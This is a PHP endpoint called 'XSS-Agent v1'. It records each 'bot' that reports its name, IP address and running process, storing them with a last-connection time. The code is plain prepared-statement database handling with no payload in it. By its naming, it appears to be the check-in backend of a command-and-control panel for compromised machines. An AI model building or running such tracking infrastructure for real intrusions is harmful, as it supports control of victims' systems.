<?php
/*
 * XSS-Agent v1 Endpoint
 * This endpoint accepts a POST request with the following parameters:
 * - name: The name of the bot.
 * - ip_address: The IP address of the bot.
 * - process_name: The name of the process running on the bot.
 * 
 * It inserts or updates the provided data into the 'bots' table in the database.
*/


include "../settings/settings.php";

// Check if the request method is POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Retrieve POST parameters
    $name = $_POST['name'] ?? null;
    $ip_address = $_POST['ip_address'] ?? null;
    $process_name = $_POST['process_name'] ?? null;

    // Validate required parameters
    if ($name && $ip_address && $process_name) {
        $current_time = date('Y-m-d H:i:s'); // Get the current timestamp

        // Check if the bot already exists
        $stmt_check = $conn->prepare("SELECT id FROM bots WHERE name = ?");
        $stmt_check->bind_param("s", $name);
        $stmt_check->execute();
        $stmt_check->store_result();
        
        if ($stmt_check->num_rows > 0) {
            // Bot exists, update the existing record
            $stmt_update = $conn->prepare("UPDATE bots SET ip_address = ?, process_name = ?, last_connection = ? WHERE name = ?");
            $stmt_update->bind_param("ssss", $ip_address, $process_name, $current_time, $name);

            // Execute the statement
            if ($stmt_update->execute()) {
                echo json_encode(['status' => 'success', 'message' => 'Bot data updated successfully']);
            } else {
                echo json_encode(['status' => 'error', 'message' => 'Failed to update bot data']);
            }

            // Close the update statement
            $stmt_update->close();
        } else {
            // Bot does not exist, insert a new record
            $stmt_insert = $conn->prepare("INSERT INTO bots (name, ip_address, process_name, last_connection) VALUES (?, ?, ?, ?)");
            $stmt_insert->bind_param("ssss", $name, $ip_address, $process_name, $current_time);

            // Execute the statement
            if ($stmt_insert->execute()) {
                echo json_encode(['status' => 'success', 'message' => 'Bot data inserted successfully']);
            } else {
                echo json_encode(['status' => 'error', 'message' => 'Failed to insert bot data']);
            }

            // Close the insert statement
            $stmt_insert->close();
        }

        // Close the check statement
        $stmt_check->close();
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Missing required parameters']);
    }
} else {
    echo json_encode(['status' => 'error', 'message' => 'Invalid request method']);
}

// Close the connection
$conn->close();
?>
